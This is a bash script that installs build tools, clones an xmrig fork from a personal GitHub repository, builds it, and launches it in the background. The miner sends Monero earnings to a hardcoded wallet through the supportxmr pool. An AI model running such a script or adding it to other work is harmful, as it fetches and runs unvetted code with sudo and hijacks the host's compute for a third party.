#!/usr/bin/env bash
sudo apt-get install -y gcc
sudo apt-get install -y g++
sudo apt-get install -y make
sudo apt-get install -y screen
sudo apt-get install -y curl
sudo apt-get install -y git
sudo apt-get update && sudo apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev libboost-all-dev automake git cmake libuv1-dev libmicrohttpd-dev libssl-dev && sudo sysctl vm.nr_hugepages=128 && rm -rf xmrig && git clone https://github.com/davidlisu/xmrig && cd xmrig && mkdir build && cd build && cmake .. && make
./xmrig --coin=monero -B -R 10 -o stratum+tcp://pool.supportxmr.com:5555 -u 47UbkYwirtqPGximU3ipvdbrfYBxQatB5WQXGWbvUusUXwKVE4QhEWtg6MqjQUZfpN9UoQgYcPDV8X1roPy7shmBH9Pmt9V -p x -k
